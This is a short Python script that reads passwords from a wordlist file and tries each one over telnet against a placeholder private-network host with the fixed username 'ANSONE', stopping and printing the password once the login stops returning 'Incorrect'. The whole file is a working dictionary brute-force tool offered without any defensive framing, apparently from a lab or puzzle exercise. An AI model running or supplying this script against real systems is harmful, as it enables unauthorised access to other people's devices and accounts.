import telnetlib
import time

HOST = "192.168.xxx.xxx"

file1 = open('/your/folder/zodiac.txt', 'r')
count = 0

for line in file1:
    count += 1
    print("Password Line{}: {}".format(count, line.strip()))
    tn = telnetlib.Telnet(HOST)
    time.sleep(0.3)
    print(tn.read_very_eager().decode('ascii'))
    print("ANSONE")
    tn.write(b"ANSONE\n")
    line = line.encode('utf_8')
    print(line.decode('ascii'))
    tn.write(line)
    tn.read_some().decode('ascii')
    result = tn.read_some().decode('ascii')
    result = result.strip()
    if result == "Incorrect":
        print("Fail")
    else:
        print("Success!")
        print("The successful password was: " + line.decode('ascii'))
        exit()
    time.sleep(0.3)
